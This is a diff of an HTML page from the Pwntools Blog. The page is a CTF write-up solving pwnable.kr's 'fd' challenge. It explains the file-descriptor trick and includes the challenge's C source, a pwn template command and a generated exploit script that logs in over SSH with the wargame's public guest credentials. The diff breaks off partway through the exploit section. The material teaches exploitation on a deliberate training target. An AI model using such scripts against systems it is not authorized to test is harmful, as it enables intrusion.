@@ -1,11 +1,153 @@
-<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Pwnable.kr: fd - Pwntools Blog</title><meta name=description content="Using pwntools to solve a simple challenge that does not require binary exploitation"><meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/pwnable-kr-fd\/","name":"Pwnable.Kr fd"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Pwnable.kr: fd","description":"Pwnable.kr is a website that offers exploitable CTF challenges, with four difficulty categories. Today, we\u0026rsquo;ll be looking at a very simple challenge, fd. The following Pwntools features are demonstrated hereL\n pwn template command-line utility for generating exploit scripts Magic args for setting runtime arguments Processes via process and pwnlib.ssh Basic information about file descriptors ","inLanguage":"en","wordCount":1613,"datePublished":"2021-02-23T00:00:00","dateModified":"2021-02-23T00:00:00","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["pwn template, file-descriptor, pwnable.kr, easy"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/pwnable-kr-fd\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script><meta property="og:title" content="Pwnable.kr: fd"><meta property="og:description" content="Using pwntools to solve a simple challenge that does not require binary exploitation"><meta property="og:image" content="https://blog.pwntools.com/img/logo.png"><meta property="og:url" content="https://blog.pwntools.com/posts/pwnable-kr-fd/"><meta property="og:type" content="website"><meta property="og:site_name" content="Pwntools Blog"><meta name=twitter:title content="Pwnable.kr: fd"><meta name=twitter:description content="Using pwntools to solve a simple challenge that does not require binary exploitation"><meta name=twitter:image content="https://blog.pwntools.com/img/logo.png"><meta name=twitter:card content="summary"><meta name=twitter:site content="@Pwntools"><meta name=twitter:creator content="@Pwntools"><meta name=generator content="Hugo 0.82.1"><link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Pwnable.kr: fd - Pwntools Blog</title>
+<meta name=description content="Using pwntools to solve a simple challenge that does not require binary exploitation">
+<meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script>
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/pwnable-kr-fd\/","name":"Pwnable.Kr fd"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/twitter.com\/ebeip90\u0027\u003eebeip90\u003c\/a\u003e"},"headline":"Pwnable.kr: fd","description":"Pwnable.kr is a website that offers exploitable CTF challenges, with four difficulty categories. Today, we\u0026rsquo;ll be looking at a very simple challenge, fd. The following Pwntools features are demonstrated hereL\n pwn template command-line utility for generating exploit scripts Magic args for setting runtime arguments Processes via process and pwnlib.ssh Basic information about file descriptors ","inLanguage":"en","wordCount":1613,"datePublished":"2021-02-23T00:00:00","dateModified":"2021-02-23T00:00:00","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["pwn template, file-descriptor, pwnable.kr, easy"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/pwnable-kr-fd\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script>
+<meta property="og:title" content="Pwnable.kr: fd">
+<meta property="og:description" content="Using pwntools to solve a simple challenge that does not require binary exploitation">
+<meta property="og:image" content="https://blog.pwntools.com/img/logo.png">
+<meta property="og:url" content="https://blog.pwntools.com/posts/pwnable-kr-fd/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Pwntools Blog">
+<meta name=twitter:title content="Pwnable.kr: fd">
+<meta name=twitter:description content="Using pwntools to solve a simple challenge that does not require binary exploitation">
+<meta name=twitter:image content="https://blog.pwntools.com/img/logo.png">
+<meta name=twitter:card content="summary">
+<meta name=twitter:site content="@Pwntools">
+<meta name=twitter:creator content="@Pwntools">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous>
+<link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous>
+<link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+<link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous>
+</head>
+<body>
+<nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+<div class=container-fluid>
+<div class=navbar-header>
+<button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
 <span class=sr-only>Toggle navigation</span>
-<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button>
-<a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a></li><li><a title=Docs href=https://docs.pwntools.com>Docs</a></li><li><a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a></li><li><a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none><span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span></a></li></ul></div><div class=avatar-container><div class=avatar-img-border><a title="Pwntools Blog" href=https://blog.pwntools.com/><img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog"></a></div></div></div></nav><div id=modalSearch class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><button type=button class=close data-dismiss=modal>&#215;</button><h4 class=modal-title>Search Pwntools Blog</h4></div><div class=modal-body><gcse:search></gcse:search></div><div class=modal-footer><button type=button class="btn btn-default" data-dismiss=modal>Close</button></div></div></div></div><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a>
+</div>
+<div class="collapse navbar-collapse" id=main-navbar>
+<ul class="nav navbar-nav navbar-right">
+<li>
+<a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a>
+</li>
+<li>
+<a title=Docs href=https://docs.pwntools.com>Docs</a>
+</li>
+<li>
+<a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a>
+</li>
+<li>
+<a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none>
+<span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span>
+</a>
+</li>
+</ul>
+</div>
+<div class=avatar-container>
+<div class=avatar-img-border>
+<a title="Pwntools Blog" href=https://blog.pwntools.com/>
+<img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog">
+</a>
+</div>
+</div>
+</div>
+</nav>
+<div id=modalSearch class="modal fade" role=dialog>
+<div class=modal-dialog>
+<div class=modal-content>
+<div class=modal-header>
+<button type=button class=close data-dismiss=modal>&#215;</button>
+<h4 class=modal-title>Search Pwntools Blog</h4>
+</div>
+<div class=modal-body>
+<gcse:search></gcse:search>
+</div>
+<div class=modal-footer>
+<button type=button class="btn btn-default" data-dismiss=modal>Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=posts-heading><h1>Pwnable.kr: fd</h1><hr class=small><h2 class=posts-subheading>Using pwntools to solve a simple challenge that does not require binary exploitation</h2></div></div></div></div></div></header><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><p><a href=Pwnable.kr%5D>Pwnable.kr</a> is a website that offers exploitable CTF challenges, with four difficulty categories. Today, we&rsquo;ll be looking at a very simple challenge, <code>fd</code>. The following Pwntools features are demonstrated hereL</p><ul><li><code>pwn template</code> command-line utility for generating exploit scripts</li><li>Magic <code>args</code> for setting runtime arguments</li><li>Processes via <code>process</code> and <code>pwnlib.ssh</code></li><li>Basic information about file descriptors</li></ul><h2 id=getting-started>Getting Started</h2><p>For this challenge, we are provieded a binary <code>fd</code> and the corresponding source code, <code>fd.c</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div>
+<header class=header-section>
+<div class="intro-header no-img">
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<div class=posts-heading>
+<h1>Pwnable.kr: fd</h1>
+<hr class=small>
+<h2 class=posts-subheading>Using pwntools to solve a simple challenge that does not require binary exploitation</h2>
+</div>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class=container role=main>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<article role=main class=blog-post>
+<p><a href=Pwnable.kr%5D>Pwnable.kr</a> is a website that offers exploitable CTF challenges, with four difficulty categories. Today, we&rsquo;ll be looking at a very simple challenge, <code>fd</code>. The following Pwntools features are demonstrated hereL</p>
+<ul>
+<li><code>pwn template</code> command-line utility for generating exploit scripts</li>
+<li>Magic <code>args</code> for setting runtime arguments</li>
+<li>Processes via <code>process</code> and <code>pwnlib.ssh</code></li>
+<li>Basic information about file descriptors</li>
+</ul>
+<h2 id=getting-started>Getting Started</h2>
+<p>For this challenge, we are provieded a binary <code>fd</code> and the corresponding source code, <code>fd.c</code>.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -25,7 +167,9 @@
 </span><span class=lnt>18
 </span><span class=lnt>19
 </span><span class=lnt>20
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
 </span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
 </span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
 </span><span class=cp></span><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
@@ -45,20 +189,45 @@
     <span class=n>printf</span><span class=p>(</span><span class=s>&#34;learn about Linux file IO</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
     <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
 <span class=p>}</span>
-</code></pre></td></tr></table></div></div><p>By looking at the source code, we can see that htere is a <code>read</code> syscall, that operates on a file descriptor, and compares the data it receives to a pre-defined string <code>"LETMEWIN"</code>.</p><h2 id=vulnerability-info>Vulnerability Info</h2><h3 id=background-on-file-descriptors>Background on File Descriptors</h3><p>By default, whenever a new process launches, there are three file descriptors &ndash; stdin is <code>STDIN_FILENO==0</code>, and is generally where input comes from. Output comes from <code>STDOUT_FILENO==1</code>, and ancillary error information is sent to stderr, <code>STDERR_FILENO==2</code>.</p><p>We want to send information to <code>stdin</code>, so we want the <code>read()</code> call to use file descriptor #0.</p><h3 id=file-descriptor-offset-0x1234>File Descriptor Offset 0x1234</h3><p>The <code>fd</code> binary takes a single command-line argument, which is the file descriptor to read from. It subtracts <code>0x1234</code> from the file descriptor, and then reads from it and compares to the <code>"LETMEWIN"</code> string.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>10
+</code></pre></td></tr></table>
+</div>
+</div><p>By looking at the source code, we can see that htere is a <code>read</code> syscall, that operates on a file descriptor, and compares the data it receives to a pre-defined string <code>"LETMEWIN"</code>.</p>
+<h2 id=vulnerability-info>Vulnerability Info</h2>
+<h3 id=background-on-file-descriptors>Background on File Descriptors</h3>
+<p>By default, whenever a new process launches, there are three file descriptors &ndash; stdin is <code>STDIN_FILENO==0</code>, and is generally where input comes from. Output comes from <code>STDOUT_FILENO==1</code>, and ancillary error information is sent to stderr, <code>STDERR_FILENO==2</code>.</p>
+<p>We want to send information to <code>stdin</code>, so we want the <code>read()</code> call to use file descriptor #0.</p>
+<h3 id=file-descriptor-offset-0x1234>File Descriptor Offset 0x1234</h3>
+<p>The <code>fd</code> binary takes a single command-line argument, which is the file descriptor to read from. It subtracts <code>0x1234</code> from the file descriptor, and then reads from it and compares to the <code>"LETMEWIN"</code> string.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>10
 </span><span class=lnt>11
 </span><span class=hl><span class=lnt>12
-</span></span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
+</span></span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
     <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
 <span class=hl>    <span class=n>len</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
-</span></code></pre></td></tr></table></div></div><p>In order to have data received, we need to provide a value that is 0x1234 higher than the file descriptor we want to send data to. Since <code>STDIN_FILENO==0</code>, we want to provide <code>0x1234</code>, such that <code>0x1234-0x1234==0==STDIN_FILENO</code>.</p><h2 id=pwntools-script-templates>Pwntools Script Templates</h2><p>Generally, I reccomend using <code>pwn template</code> (<a href=https://docs.pwntools.com/en/latest/commandline.html#pwn-template>documentation</a>) to generate a template for exploitation.</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash>$ pwn template -q <span class=se>\
+</span></code></pre></td></tr></table>
+</div>
+</div><p>In order to have data received, we need to provide a value that is 0x1234 higher than the file descriptor we want to send data to. Since <code>STDIN_FILENO==0</code>, we want to provide <code>0x1234</code>, such that <code>0x1234-0x1234==0==STDIN_FILENO</code>.</p>
+<h2 id=pwntools-script-templates>Pwntools Script Templates</h2>
+<p>Generally, I reccomend using <code>pwn template</code> (<a href=https://docs.pwntools.com/en/latest/commandline.html#pwn-template>documentation</a>) to generate a template for exploitation.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ pwn template -q <span class=se>\
 </span><span class=se></span>    --host pwnable.kr <span class=se>\
 </span><span class=se></span>    --port <span class=m>2222</span> <span class=se>\
 </span><span class=se></span>    --user fd <span class=se>\
 </span><span class=se></span>    --password guest <span class=se>\
 </span><span class=se></span>    --path /home/fd/fd <span class=se>\
 </span><span class=se></span>    &gt; exploit.py
-</code></pre></div><blockquote><p>If the command <code>pwn</code> is not available to you, you may need to put ~/.local/bin into your <code>$PATH</code> environment variable</p></blockquote><p>This will connect to the remote server and download the binary at the path provided by <code>--path</code> to the local directory, as well as create a template script for running the binary locally, as well as via running it remotely on the <code>pwnable.kr</code> server via SSH.</p><p>For the sake of showing the template that is generated, you should see something like this what is shown below.</p><p>In future posts, this template will be ommitted, and it&rsquo;ll be assumed that the template was autogenerated and the <em>EXPLOIT GOES HERE</em> code will be the only thing shown.</p><details><summary><strong>Expand full source for exploit.py</strong></summary><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+</code></pre></div><blockquote>
+<p>If the command <code>pwn</code> is not available to you, you may need to put ~/.local/bin into your <code>$PATH</code> environment variable</p>
+</blockquote>
+<p>This will connect to the remote server and download the binary at the path provided by <code>--path</code> to the local directory, as well as create a template script for running the binary locally, as well as via running it remotely on the <code>pwnable.kr</code> server via SSH.</p>
+<p>For the sake of showing the template that is generated, you should see something like this what is shown below.</p>
+<p>In future posts, this template will be ommitted, and it&rsquo;ll be assumed that the template was autogenerated and the <em>EXPLOIT GOES HERE</em> code will be the only thing shown.</p>
+<details><summary><strong>Expand full source for exploit.py</strong></summary>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># -*- coding: utf-8 -*-</span>
 <span class=c1># This exploit template was generated via:</span>
 <span class=c1># $ pwn template --host pwnable.kr --port 2222 --user fd --password guest --path /home/fd/fd</span>
@@ -79,10 +248,10 @@
 <span class=n>remote_path</span> <span class=o>=</span> <span class=s1>&#39;/home/fd/fd&#39;</span>
 
 <span class=c1># Connect to the remote SSH server</span>
-<span class=n>shell</span> <span class=o>=</span> <span class=bp>None</span>
+<span class=n>shell</span> <span class=o>=</span> <span class=kc>None</span>
 <span class=k>if</span> <span class=ow>not</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
     <span class=n>shell</span> <span class=o>=</span> <span class=n>ssh</span><span class=p>(</span><span class=n>user</span><span class=p>,</span> <span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>password</span><span class=p>)</span>
-    <span class=n>shell</span><span class=o>.</span><span class=n>set_working_directory</span><span class=p>(</span><span class=n>symlink</span><span class=o>=</span><span class=bp>True</span><span class=p>)</span>
+    <span class=n>shell</span><span class=o>.</span><span class=n>set_working_directory</span><span class=p>(</span><span class=n>symlink</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
 
 <span class=k>def</span> <span class=nf>local</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
     <span class=s1>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
@@ -134,17 +303,38 @@
 <span class=c1># log.success(flag)</span>
 
 <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</code></pre></div></details><p>The details of this template are outside the scope of this document, but the short version is that everything is set up for you and you can invoke your script and it will automatically connect to <code>pwnable.kr</code>&rsquo;s SSH server. If you were to pass e.g. <code>python exploit.py LOCAL</code>, then the binary would run locally.</p><h2 id=exploitation>Exploitation</h2><p>We need to provide a file descriptor as <code>argv[1]</code> to the specified script, which we can do easily with the <code>start()</code> function (which invokes <code>local()</code> or <code>remote()</code> as needed).</p><p>Then we need to send the data to file descriptor 0x1234-0x1234==0, which is stdin. Since this is the standard file descriptor for input, we can use the <code>pwntools</code> tube function, <a href="http://docs.pwntools.com/en/latest/tubes.html?highlight=sendline#pwnlib.tubes.tube.tube.sendline">sendline</a>.</p><p>After we send the expected string, the <code>fd</code> program will send us the contents of the flag file, which we can use <a href="http://docs.pwntools.com/en/latest/tubes.html?highlight=recvall#pwnlib.tubes.tube.tube.recvall">recvall</a> to get.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>13
+</code></pre></div>
+</details>
+<p>The details of this template are outside the scope of this document, but the short version is that everything is set up for you and you can invoke your script and it will automatically connect to <code>pwnable.kr</code>&rsquo;s SSH server. If you were to pass e.g. <code>python exploit.py LOCAL</code>, then the binary would run locally.</p>
+<h2 id=exploitation>Exploitation</h2>
+<p>We need to provide a file descriptor as <code>argv[1]</code> to the specified script, which we can do easily with the <code>start()</code> function (which invokes <code>local()</code> or <code>remote()</code> as needed).</p>
+<p>Then we need to send the data to file descriptor 0x1234-0x1234==0, which is stdin. Since this is the standard file descriptor for input, we can use the <code>pwntools</code> tube function, <a href="http://docs.pwntools.com/en/latest/tubes.html?highlight=sendline#pwnlib.tubes.tube.tube.sendline">sendline</a>.</p>
+<p>After we send the expected string, the <code>fd</code> program will send us the contents of the flag file, which we can use <a href="http://docs.pwntools.com/en/latest/tubes.html?highlight=recvall#pwnlib.tubes.tube.tube.recvall">recvall</a> to get.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>13
 </span><span class=lnt>14
 </span><span class=hl><span class=lnt>15
 </span></span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=s>&#34;LETMEWIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>strcmp</span><span class=p>(</span><span class=s>&#34;LETMEWIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
         <span class=n>printf</span><span class=p>(</span><span class=s>&#34;good job :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
 <span class=hl>        <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
 </span>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
     <span class=p>}</span>
-</code></pre></td></tr></table></div></div><h3 id=python-exploit>Python Exploit</h3><p>The exploit is rather straightforward, only requiring the correct argument in <code>argv[1]</code> and then sending the expected data. We have to convert it to a string first, so that it can be passed along as an argument. We can pass this argument to either.</p><p>The remote program will send us <code>good job :)</code> and then the contents of the flag.</p><p>The last line that we receive (<code>lines[-1]</code>) should be the password, so we log it with <code>log.success</code> to the console.</p><p>We also set <code>context.log_level='debug'</code> so that we can see all of the traffic sent and received by the challenge binary. I placed this line after <code>start</code> since there is a lot going on behind the scenes to set up the remote process, and we only care about the data sent and received.</p><p>You can see the full debug output of everything that happens by running your exploit with <code>python exploit.py DEBUG</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=python-exploit>Python Exploit</h3>
+<p>The exploit is rather straightforward, only requiring the correct argument in <code>argv[1]</code> and then sending the expected data. We have to convert it to a string first, so that it can be passed along as an argument. We can pass this argument to either.</p>
+<p>The remote program will send us <code>good job :)</code> and then the contents of the flag.</p>
+<p>The last line that we receive (<code>lines[-1]</code>) should be the password, so we log it with <code>log.success</code> to the console.</p>
